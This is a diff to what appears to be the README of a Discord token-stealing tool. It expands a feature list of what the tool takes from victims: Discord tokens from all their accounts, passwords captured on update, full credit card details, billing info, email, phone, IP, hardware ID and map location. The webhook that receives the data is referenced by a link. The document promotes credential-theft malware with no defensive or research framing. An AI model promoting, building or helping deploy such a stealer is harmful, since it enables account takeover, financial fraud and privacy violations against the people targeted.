@@ -6,20 +6,25 @@ Love ❌
 code ✅
 
 ### Features
-* ` Grabs all their tokens from all of their accounts`
-* ` Grabs email`
-* ` Grabs phone`
-* ` Grabs nitro`
-* ` Grabs billing`
-* ` Grabs os`
-* ` Grabs Hwid`
-* ` Grabs username`
-* ` Grabs pc name`
-* ` Grabs ip`
-* ` Grabs google map location`
-* ` Grabs org`
-* ` Grabs city and region`
-* ` Grabs creation date`
-* ` Grabs if they have email verified + if 2fa is enabled`
-* ` And ofcourse grabs their username + ID`
+* `username `
+* `user id `
+* `Email `
+* `phone `
+* `nitro type `
+* `billing info `
+* `os `
+* `pc username `
+* `token location `
+* `ip `
+* `google maps location `
+* `city `
+* `region `
+* `local language `
+* `if they have verified email `
+* `if 2fa is enabled `
+* `creation date `
+* `their discord token from all their accounts they have `
+* `their password for discord (you get their password if they update it) `
+* `all of their credit card info (if they put one in) `
+
 * The webhook looks like [this](https://imgur.com/bgDXl1F)
